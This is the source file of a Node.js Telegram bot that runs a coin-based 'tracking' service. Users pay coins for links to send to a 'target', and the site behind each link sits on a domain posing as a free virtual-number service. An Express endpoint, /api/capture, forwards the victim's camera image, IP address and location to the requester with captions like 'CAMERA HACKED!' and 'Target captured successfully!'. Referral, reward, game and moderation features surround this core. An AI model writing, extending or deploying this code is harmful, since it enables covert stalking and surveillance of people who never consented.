// =====================================================
// 🔱 PRO SYSTEM v7.0 - ULTIMATE MEGA EDITION 🔱
// =====================================================
// 👨‍💻 Dev: @Mrddev | 📢 Channel: @devxtechzone
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ===== MIDDLEWARE =====
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = "https://virtualnumbersfree.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";
const OWNER_ID = 6170894121;
const BOT_VERSION = "7.0.0";

// ========== DATABASES ==========
const users = new Map();
const activeTokens = new Map();
const redeemCodes = new Map();
const userWarnings = new Map();
const activeChats = new Map();
const userWorkCooldown = new Map();
const transactions = [];

// Stats
const botStats = {
  startTime: Date.now(),
  totalCommands: 0,
  totalMessages: 0,
  totalUsers: 0,
  totalGroups: 0,
  totalCoinsGiven: 0,
  totalHacksUsed: 0,
  totalReferrals: 0,
  totalRedeems: 0
};

const TOKEN_EXPIRY_MS = 10 * 60 * 1000;
const dailyBonus = { base: 1, streakBonus: [0, 2, 5, 10, 15, 20, 25, 30, 40, 50] };
const workJobs = [
  { name: "💻 Developer", minPay: 10, maxPay: 50, cooldown: 3600000 },
  { name: "🎨 Designer", minPay: 8, maxPay: 40, cooldown: 3600000 },
  { name: "📝 Writer", minPay: 5, maxPay: 30, cooldown: 3600000 },
  { name: "🎮 Gamer", minPay: 3, maxPay: 20, cooldown: 1800000 },
  { name: "🛒 Shopper", minPay: 2, maxPay: 15, cooldown: 900000 }
];

// Clean expired tokens
setInterval(() => {
  const now = Date.now();
  for (const [token, data] of activeTokens) {
    if (now - data.createdAt > TOKEN_EXPIRY_MS) {
      activeTokens.delete(token);
    }
  }
}, 60000);

// ========== HELPER FUNCTIONS ==========
function generateReferralCode(userId) {
  return crypto.createHash('md5').update(userId + Date.now().toString()).digest('hex').substring(0, 8).toUpperCase();
}

function getReferralLink(userId) {
  return `https://t.me/${bot.botInfo?.username || 'YourBot'}?start=ref_${userId}`;
}

function formatMessage(text) {
  return text.trim().replace(/ {12}/g, '');
}

function generateToken() {
  return crypto.randomBytes(8).toString("hex");
}

// ========== INITIALIZE USER (2 FREE COINS) ==========
function initUser(userId, referrerId = null) {
  if (!users.has(userId)) {
    const userData = {
      id: userId,
      joinDate: Date.now(),
      lastActive: Date.now(),
      coins: 5,
      bank: 0,
      totalEarned: 0,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      referralCode: generateReferralCode(userId),
      usedHacks: 0,
      successfulHacks: 0,
      level: 1,
      xp: 0,
      xpBoost: 1.0,
      dailyStreak: 0,
      lastDaily: null,
      weeklyStreak: 0,
      lastWeekly: null,
      monthlyStreak: 0,
      lastMonthly: null,
      totalCommands: 0,
      totalMessages: 0,
      gamesPlayed: 0,
      gamesWon: 0,
      gamblingWins: 0,
      gamblingLosses: 0,
      inventory: [],
      equippedItems: [],
      afk: null,
      customStatus: null,
      badges: ["🎁 New User"],
      friends: [],
      marriedTo: null,
      clan: null,
      notifications: true,
      language: "en",
      theme: "dark"
    };
    
    users.set(userId, userData);
    botStats.totalUsers++;
    
    // Give referrer bonus
    if (referrerId && users.has(referrerId)) {
      const referrer = users.get(referrerId);
      referrer.coins += 5;
      referrer.referrals += 1;
      referrer.totalEarned += 5;
      referrer.badges.push("🌟 Recruiter");
      users.set(referrerId, referrer);
      botStats.totalReferrals++;
      botStats.totalCoinsGiven += 5;
      
      bot.telegram.sendMessage(referrerId, formatMessage(`
╔══════════════════════════╗
║  🎉 NEW REFERRAL! 🎉     ║
╚══════════════════════════╝

👤 Someone joined using your link!

💰 <b>Reward:</b> <code>+5 COINS</code>

📊 <b>Your Stats:</b>
• Total Coins: ${referrer.coins}
• Referrals: ${referrer.referrals}
• Total Earned: ${referrer.totalEarned}

<b>Keep sharing your referral link!</b>
      `));
    }
  }
  return users.get(userId);
}

function canHack(userId) {
  const user = users.get(userId);
  return user && user.coins >= 5;
}

function useHack(userId) {
  const user = users.get(userId);
  if (user && user.coins >= 5) {
    user.coins -= 5;
    user.usedHacks += 1;
    users.set(userId, user);
    botStats.totalHacksUsed++;
    return true;
  }
  return false;
}

function addCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user) {
    user.coins += amount;
    user.totalEarned += amount;
    users.set(userId, user);
    botStats.totalCoinsGiven += amount;
    transactions.push({ userId, amount, reason, date: Date.now() });
    return true;
  }
  return false;
}

function removeCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    user.totalSpent += amount;
    users.set(userId, user);
    return true;
  }
  return false;
}

function addXP(userId, amount) {
  const user = users.get(userId);
  if (user) {
    const boostedAmount = Math.floor(amount * (user.xpBoost || 1));
    user.xp += boostedAmount;
    
    const xpNeeded = user.level * 100;
    let leveledUp = false;
    
    while (user.xp >= xpNeeded) {
      user.xp -= xpNeeded;
      user.level++;
      leveledUp = true;
      
      const levelReward = user.level * 5;
      user.coins += levelReward;
      
      bot.telegram.sendMessage(userId, formatMessage(`
╔══════════════════════════╗
║  🎉 LEVEL UP! 🎉         ║
╚══════════════════════════╝

Congratulations! You reached <b>Level ${user.level}</b>!

💰 Reward: <code>+${levelReward} COINS</code>
⚡ XP Boost: ${user.xpBoost}x

Keep it up!
      `));
    }
    
    users.set(userId, user);
    return leveledUp;
  }
  return false;
}

function generateRedeemCode(coins, maxUses = 1, expiresInHours = 24, description = "") {
  const code = crypto.randomBytes(6).toString("hex").toUpperCase();
  redeemCodes.set(code, {
    coins: coins,
    usedBy: [],
    maxUses: maxUses,
    remainingUses: maxUses,
    createdBy: OWNER_ID,
    createdAt: Date.now(),
    expiresAt: Date.now() + (expiresInHours * 60 * 60 * 1000),
    description: description
  });
  return code;
}

function redeemCode(userId, code) {
  const codeData = redeemCodes.get(code.toUpperCase());
  
  if (!codeData) return { success: false, message: "❌ Invalid code!" };
  if (Date.now() > codeData.expiresAt) {
    redeemCodes.delete(code);
    return { success: false, message: "❌ Code expired!" };
  }
  if (codeData.remainingUses <= 0) return { success: false, message: "❌ Code already used up!" };
  if (codeData.usedBy.includes(userId)) return { success: false, message: "❌ You already used this code!" };
  
  addCoins(userId, codeData.coins, `Redeemed code: ${code}`);
  codeData.usedBy.push(userId);
  codeData.remainingUses--;
  redeemCodes.set(code, codeData);
  botStats.totalRedeems++;
  
  return { success: true, message: `✅ You redeemed ${codeData.coins} coins!`, coins: codeData.coins };
}

// ========== FORCE JOIN CHECK ==========
async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return ["creator", "administrator", "member"].includes(member.status);
  } catch {
    return false;
  }
}

// ========== MENUS ==========
function mainMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎯 TRACKING", "tracking_menu")],
    [Markup.button.callback("👑 GROUP TOOLS", "group_menu")],
    [Markup.button.callback("🎮 GAMES", "games_menu")],
    [Markup.button.callback("💰 ECONOMY", "economy_menu")],
    [Markup.button.callback("👤 PROFILE", "profile"), Markup.button.callback("📊 STATS", "stats")],
    [Markup.button.callback("🎁 REDEEM", "redeem_menu")],
    [Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone"), Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev")]
  ]);
}

function trackingMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎱 POOL TRACKING", "pool")],
    [Markup.button.callback("⚡ NORMAL TRACKING", "normal")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

function groupMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("⚠️ WARN", "warn_user"), Markup.button.callback("🔨 KICK", "kick_user")],
    [Markup.button.callback("🚫 BAN", "ban_user"), Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

function gamesMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎲 DICE", "dice_game"), Markup.button.callback("💰 DAILY", "daily")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

function economyMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("💰 DAILY", "daily"), Markup.button.callback("💼 WORK", "work")],
    [Markup.button.callback("🎁 REFERRAL", "referral_info"), Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from || !ctx.chat || ctx.chat.type === "channel") return;
  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") return next();
  
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.telegram.sendMessage(ctx.from.id, formatMessage(`
╔══════════════════════════╗
║  🚫 ACCESS LOCKED       ║
╚══════════════════════════╝

🔐 You must join our channel first!

👇 <b>Click below to join</b>
    `), {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
          [{ text: "✅ I JOINED", callback_data: "check_join" }]
        ]
      }
    });
  }
  return next();
});

// ========== START COMMAND ==========
bot.start(async (ctx) => {
  let referrerId = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    referrerId = parseInt(args[1].replace("ref_", ""));
    if (isNaN(referrerId)) referrerId = null;
  }
  
  const user = initUser(ctx.from.id, referrerId);
  user.lastActive = Date.now();
  users.set(ctx.from.id, user);
  
  const referralLink = getReferralLink(ctx.from.id);
  
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
╔══════════════════════════╗
║  🔱 PRO SYSTEM v7.0     ║
║  ⚡ ULTIMATE EDITION    ║
╚══════════════════════════╝

✨ <b>Welcome ${ctx.from.first_name}!</b>

💰 <b>Your Balance:</b> ${user.coins} coins
📊 <b>Level:</b> ${user.level}
👥 <b>Referrals:</b> ${user.referrals}

🎁 <b>You got 5 FREE coins!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🔗 Your Referral Link:</b>
<code>${referralLink}</code>

<i>Share this link - earn 2 coins per referral!</i>

━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>Select a module below</b>
    `),
    parse_mode: "HTML",
    ...mainMenu()
  });
});

bot.action("check_join", async (ctx) => {
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.answerCbQuery("❌ Join channel first!", { show_alert: true });
  }
  await ctx.answerCbQuery("✅ Access Granted! 🎉");
  await ctx.deleteMessage();
  
  const user = initUser(ctx.from.id);
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
╔══════════════════════════╗
║  🔱 PRO SYSTEM v7.0     ║
║  ⚡ ULTIMATE EDITION    ║
╚══════════════════════════╝

✅ <b>Access Unlocked!</b>

💰 <b>Your Balance:</b> ${user.coins} coins

🎯 <b>Select a module below</b>
    `),
    parse_mode: "HTML",
    ...mainMenu()
  });
});

// ========== TRACKING MODES ==========
bot.action("tracking_menu", async (ctx) => {
  await ctx.editMessageCaption("🎯 Select tracking mode:", {
    parse_mode: "HTML",
    ...trackingMenu()
  });
});

bot.action("pool", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(formatMessage(`
❌ <b>Insufficient Coins!</b>

You need <code>5 coin</code> to use tracking.
Current balance: ${users.get(ctx.from.id)?.coins || 0} coins

🎁 <b>Ways to earn coins:</b>
• Daily reward - /daily
• Referrals - Share your link
• Work - /work
• Redeem codes
• Play games
    `), { parse_mode: "HTML" });
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "pool",
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), TOKEN_EXPIRY_MS);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎱 POOL MODE ACTIVE    ║
╚══════════════════════════╝

✅ Tracking initialized!
💰 <b>Coins deducted:</b> <code>-5</code>
⏱️ <b>Token expires in:</b> 10 minutes

<b>Share this link with target:</b>
<code>${DOMAIN}?token=${token}</code>

⚠️ <i>Link expires in 10 minutes!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "tracking_menu")]
  ]) });
});

bot.action("normal", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(formatMessage(`
❌ <b>Insufficient Coins!</b>

You need <code>5 coin</code> to use tracking.
Current balance: ${users.get(ctx.from.id)?.coins || 0} coins
    `), { parse_mode: "HTML" });
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "normal",
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), TOKEN_EXPIRY_MS);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  ⚡ NORMAL MODE ACTIVE  ║
╚══════════════════════════╝

✅ Tracking initialized!
💰 <b>Coins deducted:</b> <code>-1</code>
⏱️ <b>Token expires in:</b> 10 minutes

<b>Share this link:</b>
<code>${DOMAIN}?token=${token}</code>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "tracking_menu")]
  ]) });
});

// ========== ECONOMY ==========
bot.action("economy_menu", async (ctx) => {
  await ctx.editMessageCaption("💰 Economy Menu:", {
    parse_mode: "HTML",
    ...economyMenu()
  });
});

bot.action("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && (now - user.lastDaily) < dayInMs) {
    const remaining = dayInMs - (now - user.lastDaily);
    const hours = Math.floor(remaining / 3600000);
    const minutes = Math.floor((remaining % 3600000) / 60000);
    return ctx.reply(`⏰ Daily reward already claimed! Come back in ${hours}h ${minutes}m.`);
  }
  
  let streak = user.dailyStreak;
  if (user.lastDaily && (now - user.lastDaily) < dayInMs * 2) {
    streak++;
  } else {
    streak = 1;
  }
  
  const baseReward = dailyBonus.base;
  const streakBonus = dailyBonus.streakBonus[Math.min(streak, 10)] || 0;
  const totalReward = baseReward + streakBonus;
  
  addCoins(ctx.from.id, totalReward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎁 DAILY REWARD! 🎁    ║
╚══════════════════════════╝

💰 <b>You received:</b> <code>+${totalReward} COINS</code>

📊 <b>Breakdown:</b>
• Base: ${baseReward}
• Streak Bonus: +${streakBonus}

🔥 <b>Current Streak:</b> ${streak} day(s)

💎 <b>New Balance:</b> ${user.coins + totalReward} coins

<i>Come back tomorrow for more!</i>
  `), { parse_mode: "HTML" });
});

bot.action("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const remaining = 3600000 - (now - lastWork);
    const minutes = Math.ceil(remaining / 60000);
    return ctx.reply(`⏰ You're tired! Rest for ${minutes} minutes before working again.`);
  }
  
  const job = workJobs[Math.floor(Math.random() * workJobs.length)];
  const reward = Math.floor(Math.random() * (job.maxPay - job.minPay + 1) + job.minPay);
  
  addCoins(userId, reward, `Worked as ${job.name}`);
  userWorkCooldown.set(userId, now);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  💼 WORK COMPLETE! 💼   ║
╚══════════════════════════╝

👔 <b>Job:</b> ${job.name}
💰 <b>Payment:</b> <code>+${reward} COINS</code>

💎 <b>New Balance:</b> ${users.get(userId).coins} coins

<i>Come back in 1 hour for another shift!</i>
  `), { parse_mode: "HTML" });
});

bot.action("referral_info", async (ctx) => {
  const user = initUser(ctx.from.id);
  const link = getReferralLink(ctx.from.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎁 REFERRAL SYSTEM     ║
╚══════════════════════════╝

<b>Your Referral Link:</b>
<code>${link}</code>

<b>Your Stats:</b>
• Referrals: ${user.referrals}
• Coins Earned: ${user.totalEarned}

<b>Rewards:</b>
• 2 coins per referral
• Special badge at 10 referrals
• Bonus rewards at 25, 50, 100

<i>Share your link and earn coins!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "economy_menu")]
  ]) });
});

// ========== PROFILE & STATS ==========
bot.action("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  👤 USER PROFILE        ║
╚══════════════════════════╝

<b>📝 Basic Info:</b>
• Name: ${ctx.from.first_name}
• Username: @${ctx.from.username || 'None'}
• ID: <code>${ctx.from.id}</code>

<b>💰 Economy:</b>
• Coins: ${user.coins}
• Bank: ${user.bank}
• Total Earned: ${user.totalEarned}
• Total Spent: ${user.totalSpent}

<b>📊 Stats:</b>
• Level: ${user.level} (${user.xp}/100 XP)
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games Won: ${user.gamesWon}/${user.gamesPlayed}

<b>🏆 Badges:</b>
${user.badges.map(b => `• ${b}`).join('\n')}

<i>🎯 Keep playing to earn more rewards!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("🔄 REFRESH", "profile")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

bot.action("stats", async (ctx) => {
  const user = initUser(ctx.from.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  📊 BOT STATISTICS      ║
╚══════════════════════════╝

<b>🤖 Bot Stats:</b>
• Version: ${BOT_VERSION}
• Uptime: ${Math.floor((Date.now() - botStats.startTime) / 86400000)} days
• Total Users: ${botStats.totalUsers}
• Total Groups: ${botStats.totalGroups}

<b>💰 Economy:</b>
• Total Coins Given: ${botStats.totalCoinsGiven}
• Total Referrals: ${botStats.totalReferrals}
• Total Hacks Used: ${botStats.totalHacksUsed}
• Total Redeems: ${botStats.totalRedeems}

<b>👤 Your Stats:</b>
• Level: ${user.level}
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games Won: ${user.gamesWon}/${user.gamesPlayed}
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("🔄 REFRESH", "stats")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

// ========== REDEEM SYSTEM ==========
bot.action("redeem_menu", async (ctx) => {
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎁 REDEEM CODE        ║
╚══════════════════════════╝

<b>Enter your redeem code:</b>

Type: <code>/redeem YOUR_CODE</code>

━━━━━━━━━━━━━━━━━━━━━━━━━

<i>Get codes from:
• Giveaways
• Events
• Support channel</i>
  `), { parse_mode: "HTML" });
});

bot.command("redeem", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /redeem <CODE>");
  }
  
  const code = args[1];
  const result = redeemCode(ctx.from.id, code);
  
  if (result.success) {
    const user = users.get(ctx.from.id);
    await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  ✅ REDEEM SUCCESS!     ║
╚══════════════════════════╝

🎉 ${result.message}

💰 <b>New Balance:</b> ${user.coins} coins
    `), { parse_mode: "HTML" });
  } else {
    await ctx.reply(result.message);
  }
});

// ========== GAMES ==========
bot.action("games_menu", async (ctx) => {
  await ctx.editMessageCaption("🎮 Games Menu:", {
    parse_mode: "HTML",
    ...gamesMenu()
  });
});

bot.action("dice_game", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = 1;
  
  if (user.coins < bet) return ctx.reply("❌ Not enough coins!");
  
  removeCoins(ctx.from.id, bet, "Dice bet");
  const roll = Math.floor(Math.random() * 6) + 1;
  const win = roll >= 4;
  
  if (win) {
    const winnings = bet * 2;
    addCoins(ctx.from.id, winnings, "Won dice game");
    user.gamesWon++;
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll} and WON!\n💰 You won ${winnings} coins!`);
  } else {
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll} and LOST!\n💸 You lost ${bet} coin!`);
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// ========== GROUP ADMIN COMMANDS ==========
bot.action("group_menu", async (ctx) => {
  await ctx.editMessageCaption("👑 Group Management:", {
    parse_mode: "HTML",
    ...groupMenu()
  });
});

bot.command("warn", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return ctx.reply("Group only!");
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to warn them!");
  
  const userId = reply.from.id;
  const warns = (userWarnings.get(userId) || 0) + 1;
  userWarnings.set(userId, warns);
  
  await ctx.reply(`⚠️ ${reply.from.first_name} warned! (${warns}/3)`);
  
  if (warns >= 3) {
    await ctx.telegram.banChatMember(ctx.chat.id, userId);
    userWarnings.delete(userId);
    await ctx.reply(`🚫 ${reply.from.first_name} banned for 3 warnings!`);
  }
});

bot.command("kick", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to kick!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.telegram.unbanChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`👢 ${reply.from.first_name} kicked!`);
});

bot.command("ban", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to ban!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`🚫 ${reply.from.first_name} banned!`);
});

// ========== CHAT WITH DEV ==========
bot.command("chat", async (ctx) => {
  activeChats.set(ctx.chat.id, true);
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  💬 CHAT MODE ACTIVE    ║
╚══════════════════════════╝

✅ You can now message the developer!

📨 <b>Instructions:</b>
• Send any message
• Dev will reply here
• Type /exit to leave

<i>Response time: Usually within minutes</i>
  `), { parse_mode: "HTML" });
});

bot.command("exit", async (ctx) => {
  if (activeChats.has(ctx.chat.id)) {
    activeChats.delete(ctx.chat.id);
    await ctx.reply("✅ Exited chat mode. Type /chat to start again.");
  } else {
    await ctx.reply("⚠️ You are not in chat mode!");
  }
});

// ========== MESSAGE HANDLER ==========
bot.on("text", async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;
  if (!msg.text || msg.text.startsWith("/")) return;
  
  botStats.totalMessages++;
  
  // Owner reply system
  if (chatId === OWNER_ID && msg.reply_to_message) {
    const replyText = msg.reply_to_message.text || msg.reply_to_message.caption || "";
    const match = replyText.match(/🆔 ID: (\d+)/);
    if (match) {
      const userId = parseInt(match[1]);
      try {
        await ctx.telegram.sendMessage(userId, formatMessage(`
💬 <b>Reply from Developer:</b>

${msg.text}

<i>🔐 This is a secure message</i>
        `), { parse_mode: "HTML" });
        await ctx.reply("✅ Reply sent!");
      } catch (err) {
        await ctx.reply("❌ Failed to send reply.");
      }
      return;
    }
  }
  
  // User to owner chat
  if (activeChats.has(chatId)) {
    try {
      await ctx.telegram.sendMessage(OWNER_ID, formatMessage(`
📨 <b>New Message from User</b>

👤 <b>Name:</b> ${msg.from.first_name}
🔗 <b>Username:</b> @${msg.from.username || 'None'}
🆔 <b>ID:</b> ${chatId}

💬 <b>Message:</b>
${msg.text}

✏️ <i>Reply to this message to respond</i>
      `), { parse_mode: "HTML" });
      await ctx.reply("✅ Message sent to developer!");
    } catch (err) {
      await ctx.reply("❌ Failed to send message.");
    }
  }
  
  addXP(chatId, 1);
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  👑 ADMIN PANEL         ║
╚══════════════════════════╝

<b>Admin Commands:</b>

💰 <b>Economy:</b>
/addcoins @user 100 - Add coins

🎁 <b>Redeem Codes:</b>
/gencode 50 10 24 - Generate code

📢 <b>Broadcast:</b>
/broadcast message - Send to all

📊 <b>Stats:</b>
/botstats - Full bot stats
  `), { parse_mode: "HTML" });
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  const coins = parseInt(args[1]) || 50;
  const uses = parseInt(args[2]) || 10;
  const hours = parseInt(args[3]) || 24;
  
  const code = generateRedeemCode(coins, uses, hours);
  await ctx.reply(formatMessage(`
✅ <b>Redeem Code Generated!</b>

🎁 <b>Code:</b> <code>${code}</code>
💰 <b>Coins:</b> ${coins}
🔄 <b>Max Uses:</b> ${uses}
⏱️ <b>Expires:</b> ${hours} hours

<i>Share this code with users!</i>
  `), { parse_mode: "HTML" });
});

bot.command("addcoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /addcoins @user amount");
  
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  
  let targetId = null;
  for (const [id, data] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) return ctx.reply("User not found!");
  
  addCoins(targetId, amount, "Admin added");
  await ctx.reply(`✅ Added ${amount} coins to @${username}!`);
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /broadcast message");
  
  let success = 0;
  for (const [userId] of users) {
    try {
      await ctx.telegram.sendMessage(userId, formatMessage(`
╔══════════════════════════╗
║  📢 ANNOUNCEMENT        ║
╚══════════════════════════╝

${message}

<i>— Admin Team</i>
      `), { parse_mode: "HTML" });
      success++;
    } catch(e) {}
  }
  
  await ctx.reply(`✅ Broadcast sent to ${success} users!`);
});

bot.command("botstats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const uptime = Date.now() - botStats.startTime;
  const uptimeDays = Math.floor(uptime / 86400000);
  const uptimeHours = Math.floor((uptime % 86400000) / 3600000);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  📊 FULL BOT STATS      ║
╚══════════════════════════╝

<b>🤖 Bot:</b>
• Version: ${BOT_VERSION}
• Uptime: ${uptimeDays}d ${uptimeHours}h
• Users: ${botStats.totalUsers}

<b>💰 Economy:</b>
• Total Coins: ${botStats.totalCoinsGiven}
• Active Codes: ${redeemCodes.size}
• Referrals: ${botStats.totalReferrals}

<b>📈 Activity:</b>
• Hacks: ${botStats.totalHacksUsed}
• Redeems: ${botStats.totalRedeems}
  `), { parse_mode: "HTML" });
});

// ========== BACK BUTTONS ==========
bot.action("main_back", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════╗
║  🔱 PRO SYSTEM v7.0     ║
║  ⚡ ULTIMATE EDITION    ║
╚══════════════════════════╝

💰 <b>Balance:</b> ${user.coins} coins
📊 <b>Level:</b> ${user.level}

🎯 <b>Select a module below</b>
  `), { parse_mode: "HTML", ...mainMenu() });
});

// ========== API ENDPOINT ==========
app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location } = req.body;
    
    if (!token || !activeTokens.has(token)) {
      return res.status(400).json({ error: "Invalid token" });
    }
    
    const tokenData = activeTokens.get(token);
    
    if (image) {
      const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(tokenData.chatId, { source: buffer }, {
        caption: formatMessage(`
╔══════════════════════════╗
║  📸 CAMERA HACKED!      ║
╚══════════════════════════╝

🌐 <b>IP Address:</b> ${ip || "Unknown"}
📍 <b>Location:</b> ${location || "Unknown"}
🕐 <b>Time:</b> ${new Date().toLocaleString()}

<i>🔐 Target captured successfully!</i>
        `),
        parse_mode: "HTML"
      });
    } else {
      await bot.telegram.sendMessage(tokenData.chatId, formatMessage(`
╔══════════════════════════╗
║  📍 LOCATION TRACKED!   ║
╚══════════════════════════╝

🌐 <b>IP Address:</b> ${ip || "Unknown"}
📍 <b>Location:</b> ${location || "Unknown"}
🕐 <b>Time:</b> ${new Date().toLocaleString()}
      `), { parse_mode: "HTML" });
    }
    
    const user = users.get(tokenData.userId);
    if (user) {
      user.successfulHacks = (user.successfulHacks || 0) + 1;
      users.set(tokenData.userId, user);
    }
    
    activeTokens.delete(token);
    res.json({ status: "success" });
    
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// ========== SERVE FRONTEND ==========
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

bot.launch().then(() => {
  console.log(`🤖 Bot running!`);
  console.log(`🔱 PRO SYSTEM v${BOT_VERSION} is LIVE!`);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
